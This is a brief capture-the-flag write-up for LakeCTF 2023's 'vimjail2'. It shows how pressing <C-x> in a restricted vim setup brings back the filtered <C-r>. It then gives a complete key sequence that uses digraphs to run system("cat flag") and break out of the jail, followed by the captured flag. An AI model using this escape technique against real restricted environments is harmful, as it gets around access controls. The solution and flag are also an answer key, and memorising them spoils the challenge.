# 2023 LakeCTF - vimjail2

The challenge was the same as the first `vimjail`, but this time `<C-r>` was sanitized with `nope`.

The solution was the same, only before using the same trick, one needed to press `<C-x>` which switched vim into completion mode and `<C-r>` was again a possibility:

Complete solution:
```
<C-x><C-r>=<C-k>ys<C-k>yy<C-k>ys<C-k>yt<C-k>ye<C-k>ym<C-k>y("<C-k>yc<C-k>ya<C-k>yt <C-k>yf<C-k>yl<C-k>ya<C-k>yg"<C-k>y)
EPFL{vim_worse_than_macs_eh}
```
